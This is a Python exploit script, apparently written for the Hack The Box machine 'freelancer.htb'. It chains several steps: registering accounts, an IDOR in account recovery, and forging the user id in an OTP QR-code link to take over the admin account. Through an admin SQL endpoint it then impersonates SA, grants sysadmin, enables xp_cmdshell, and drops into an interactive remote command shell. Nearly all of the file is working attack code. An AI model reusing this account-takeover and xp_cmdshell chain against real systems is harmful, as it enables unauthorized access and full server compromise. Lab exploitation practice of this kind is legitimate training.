import httpx
from bs4 import BeautifulSoup
from pwn import *
from PIL import Image
from io import BytesIO
from pyzbar.pyzbar import decode
import re

URL = "http://freelancer.htb"
# change this to debug if you want to see the csrf logger
context.log_level = 'info'

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url, proxy={
            "http://" : "http://127.0.0.1:8080"
        })
        
    
   
class API(BaseAPI):
    def getCsrfToken(self,path):
        if hasattr(self, 'admin_cookies'):

            r = self.c.get(path, cookies={
                'sessionid' : self.admin_cookies
            }, follow_redirects=True)
         
        else:
            r = self.c.get(path)
        self.csrf_token = r.cookies["csrftoken"]
        soup = BeautifulSoup(r.text, "html.parser")
        csrf = soup.find("input", {"name": "csrfmiddlewaretoken"})
        if csrf:
            csrf_value = csrf["value"]
            self.csrf_middleware = csrf_value
            debug(f"csrf/{self.csrf_middleware} from path{path}")
        else:
            csrf_value = re.findall(r'csrfmiddlewaretoken: "(.*?)"', r.text)
            if len(csrf_value) >= 1:
                self.csrf_middleware = csrf_value[0]
                debug(f"csrf/{self.csrf_middleware} from path{path}")
            else:
                warn("csrf token/middleware is not found")
        
    
    def FreelancerLogin(self, user, password):
        path = "/accounts/login/"
        self.getCsrfToken(path)
        r = self.c.post(path, data={
             "csrfmiddlewaretoken": self.csrf_middleware,
            "username": user,
            "password" : password
        })
        self.freelancer_sessionid = r.cookies["sessionid"]
        info(f"success login freelancer account {user}:{password}")
    def EmployerLogin(self, user, password):
        path = "/accounts/login/"
        self.getCsrfToken(path)
        r = self.c.post(path, data={
             "csrfmiddlewaretoken": self.csrf_middleware,
            "username": user,
            "password" : password
        })
        self.employer_sessionid = r.cookies["sessionid"]
        info(f"success login employer account {user}:{password}")
    def createAccountFreelancer(self, user, passwd):
        path = "/freelancer/register/"
        self.getCsrfToken(path)
        r = self.c.post(path, data={
            "csrfmiddlewaretoken": self.csrf_middleware,
            "username": user,
            "email" : f"{user}@gmail.com",
            "first_name": user,
            "last_name": user,
            "address" : user,
            "security_q1": user,
            "security_q2": user,
            "security_q3": user,
            "job_title": user,
            "years_of_experience": 33,
            "description": user,
            "password1": passwd,
            "password2": passwd
        }, cookies={
            "csrftoken" : self.csrf_token
        }, headers={'Content-Type': 'application/x-www-form-urlencoded'} )
        
        api.FreelancerLogin(user,passwd)
        
    def createAccountEmployer(self, user, passwd):
        path = "/employer/register/"
        self.getCsrfToken(path)
        r =  self.c.post(path, data={
            "csrfmiddlewaretoken": self.csrf_middleware,
            "username": user,
            "email" : f"{user}@gmail.com",
            "first_name": user,
            "last_name": user,
            "address" : user,
            "security_q1": user,
            "security_q2": user,
            "security_q3": user,
            "company_name": user,
            "password1": passwd,
            "password2": passwd
        }, cookies={
            "csrftoken" : self.csrf_token
        }, headers={'Content-Type': 'application/x-www-form-urlencoded'} , follow_redirects=False)
        info(f"success create emplyer account {user}:{passwd}")
        
    def ActivateAccountIDOR(self, userEmployer, password):
        path = "/accounts/recovery/"
        self.getCsrfToken(path)
        r = self.c.post(path, data={
            "csrfmiddlewaretoken": self.csrf_middleware,
            "username": userEmployer,
            "security_q1": userEmployer,
            "security_q2": userEmployer,
            "security_q3": userEmployer,
        }, cookies={
            "sessionid":self.freelancer_sessionid
        })
        api.EmployerLogin(userEmployer, password)
        return "success activate employer account through idor account recovery"
    def GetQrCode(self, idTakeover):
        path = "/accounts/otp/qrcode/generate/" 
        r = self.c.get(path, cookies={
            "sessionid" :self.employer_sessionid
        })
        image = Image.open(BytesIO(r.content))
        qr_codes = decode(image)
        for qr_code in qr_codes:
            match = re.search(r'otp/([^/]+)/', qr_code.data.decode('utf-8'))
            if match:
                otp_string = match.group(1)
                decoded_otp_string = base64.b64decode(otp_string).decode()
                encoded_idTakeover = base64.b64encode(idTakeover.encode()).decode()
                info(f'changing id for otp {otp_string}:{decoded_otp_string} to {encoded_idTakeover}:{idTakeover}')
                self.adminUrl = qr_code.data.decode('utf-8').replace(otp_string, encoded_idTakeover)
                success(f'here the full link {self.adminUrl}, for admin takeover. enjoy it.' )
            else:
                error("No match found")
                
    def LoginAdmin(self):
        r = self.c.get(f"{self.adminUrl}")
        self.admin_cookies = r.cookies["sessionid"]
    
    def QuerySqli(self, query):
        path = "/admin/executeRawSql/" 
        self.getCsrfToken("/admin")
        return self.c.post(path, data={
            'query': query,
            'csrfmiddlewaretoken' : self.csrf_middleware
        }, cookies={
            'sessionid': self.admin_cookies
        })
        
    def BypassXpCmdShell(self):
        api.LoginAdmin()
        info(f'admin cookies : {self.admin_cookies}')
        api.QuerySqli("""EXECUTE AS LOGIN = 'SA'
EXEC sp_addsrvrolemember 'Freelancer_webapp_user', 'sysadmin'""")
        api.QuerySqli("""

-- this turns on advanced options and is needed to configure xp_cmdshell
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
-- this enables xp_cmdshell
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE

""")    
    def RceSqli(self,cmd):
        
        rows = api.QuerySqli(f"xp_cmdshell '{cmd}'").json().get('result', {}).get('rows', [])
        for row in rows:
            if len(row) >= 1:
                success(row[0])
        
    ...

if __name__ == "__main__":
    api = API()
    api.createAccountFreelancer('replicannormal', '@Hack4you1337')
    api.createAccountEmployer('replicanlw', '@Hack4you1337')
    info(api.ActivateAccountIDOR('replicanlw', '@Hack4you1337'))
    api.GetQrCode(idTakeover='2')
    isRce = input(info('do u want to get the rce automatically through xp_cmdshell? (y/n)'))
    if "y" or "Y" in isRce:
        api.BypassXpCmdShell()
        while True:
            cmd = input('cmd > ')
            api.RceSqli(cmd)